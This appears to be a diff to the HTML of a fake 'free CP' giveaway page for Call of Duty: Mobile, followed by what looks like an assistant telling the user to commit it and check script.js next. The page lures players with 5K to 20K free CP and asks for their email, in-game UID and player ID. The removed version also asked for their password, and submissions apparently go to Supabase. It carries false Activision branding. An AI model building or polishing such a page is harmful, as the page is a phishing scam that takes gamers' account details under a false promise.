@@ -1,65 +1,121 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#050505">
-<title>CODM GIFT CRATES</title>
-<link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#050505">
+  <title>CODM GIFT CRATES</title>
+  <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
-<div class="page">
-  <header class="topbar">
-    <div class="brand">CODM <span>GIFT CRATES</span></div>
-    <div class="event">FREE CP EVENT</div>
-  </header>
+  <div class="page">
 
-  <section class="hero">
-    <div class="kicker">PLAY • GRIND • EARN</div>
-    <h1>CLAIM YOUR<br><span>FREE CP</span></h1>
-    <p>Choose your reward and enter your Call of Duty: Mobile player details.</p>
+    <header class="topbar">
+      <div class="brand">CODM <span>GIFT CRATES</span></div>
+      <div class="event">FREE CP EVENT</div>
+    </header>
 
-    <div class="rewards">
-      <button class="reward" data-cp="5K"><strong>5K</strong><small>CP</small></button>
-      <button class="reward" data-cp="8K"><strong>8K</strong><small>CP</small></button>
-      <button class="reward" data-cp="10K"><strong>10K</strong><small>CP</small></button>
-      <button class="reward" data-cp="20K"><strong>20K</strong><small>CP</small></button>
-    </div>
+    <section class="hero">
+      <div class="kicker">PLAY • GRIND • EARN</div>
 
-    <div class="form-card">
-      <h2>Enter Your Details</h2>
-      <div class="sub">Select a reward and complete the form.</div>
+      <h1>
+        CLAIM YOUR<br>
+        <span>FREE CP</span>
+      </h1>
 
-      <form id="claimForm">
-        <div class="field">
-          <label for="email">EMAIL</label>
-          <input id="email" type="email" placeholder="you@example.com" required>
+      <p>
+        Choose your reward and enter your Call of Duty: Mobile player details.
+      </p>
+
+      <div class="rewards">
+        <button type="button" class="reward" data-cp="5K">
+          <strong>5K</strong>
+          <small>CP</small>
+        </button>
+
+        <button type="button" class="reward" data-cp="8K">
+          <strong>8K</strong>
+          <small>CP</small>
+        </button>
+
+        <button type="button" class="reward" data-cp="10K">
+          <strong>10K</strong>
+          <small>CP</small>
+        </button>
+
+        <button type="button" class="reward" data-cp="20K">
+          <strong>20K</strong>
+          <small>CP</small>
+        </button>
+      </div>
+
+      <div class="form-card">
+        <h2>Enter Your Details</h2>
+
+        <div class="sub">
+          Select a reward and complete the form.
         </div>
-        <div class="field">
-          <label for="password">PASSWORD</label>
-          <input id="password" type="password" placeholder="Enter your password" required>
-        </div>
-      
-        <div class="field">
-          <label for="uid">IN-GAME UID</label>
-          <input id="uid" type="text" placeholder="Enter your UID" required>
-        </div>
-        <div class="field">
-          <label for="player">PLAYER ID</label>
-          <input id="player" type="text" placeholder="Enter your Player ID" required>
+
+        <form id="claimForm">
+
+          <div class="field">
+            <label for="email">EMAIL</label>
+            <input
+              id="email"
+              type="email"
+              placeholder="you@example.com"
+              required
+            >
+          </div>
+
+          <div class="field">
+            <label for="uid">IN-GAME UID</label>
+            <input
+              id="uid"
+              type="text"
+              placeholder="Enter your UID"
+              required
+            >
+          </div>
+
+          <div class="field">
+            <label for="player">PLAYER ID</label>
+            <input
+              id="player"
+              type="text"
+              placeholder="Enter your Player ID"
+              required
+            >
+          </div>
+
+          <button class="claim" type="submit">
+            CLAIM CP NOW
+          </button>
+
+        </form>
+
+        <div class="gift-crates">
+          Activision
         </div>
 
-        <button class="claim" type="submit">CLAIM CP NOW</button>
-      </form>
+        <div id="result" class="result" hidden></div>
+      </div>
+    </section>
 
-      <div class="GIFT CRATES"> Activision</div>
-      <div id="result" class="result" hidden></div>
-    </div>
-  </section>
+    <footer>
+      CODM GIFT CRATES • FREE CP EVENT
+    </footer>
 
-  <footer>CODM GIFT CRATES • FREE CP EVENT</footer>
-</div>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script src="script.js"></script>
+  </div>
+
+  <!-- Supabase -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <!-- Your JavaScript -->
+  <script src="script.js"></script>
+
 </body>
 </html>
+
+Next: replace everything in "index.html" with this, save/commit it to GitHub, and then we'll check your "script.js" next.
